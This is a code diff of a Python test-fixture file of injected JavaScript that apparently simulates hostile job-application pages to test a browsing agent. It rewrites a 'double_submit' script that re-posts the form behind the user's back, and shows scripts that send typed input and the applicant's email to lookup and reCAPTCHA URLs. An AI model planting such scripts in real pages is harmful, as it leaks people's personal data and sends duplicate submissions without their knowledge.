@@ -128,12 +128,12 @@ _SCRIPTS = {
       return "https://boards-api.greenhouse.io/fake-lookup/" + kind + "?q=" + encodeURIComponent(text)
         + "&e=" + encodeURIComponent(document.getElementById("email").value);
     };""",
-    "double_submit": """var realFetch = window.fetch;
-    window.fetch = function (url, options) {
-      var first = realFetch(url, options);
-      if (options && options.method === "POST") realFetch(url, options).catch(function () {});
-      return first;
-    };""",
+    # The agent's init script makes window.fetch read-only (it strips keepalive), so the second POST comes from a submit listener of its
+    # own that runs right after the form's: the same address, the same body, while the first is still in flight.
+    "double_submit": _FORM + """.addEventListener("submit", function () {
+      if (window.grValidate()) return;
+      fetch("https://boards.greenhouse.io" + window.__loader.submitPath, {method: "POST", body: new FormData(""" + _FORM + """)}).catch(function () {});
+    });""",
     "captcha_body_leak": _FORM + """.addEventListener("input", function (e) {
       if (e.target.value) fetch("https://www.google.com/recaptcha/api2/reload?k=fixture", {method: "POST", body: e.target.value}).catch(function () {});
     });""",
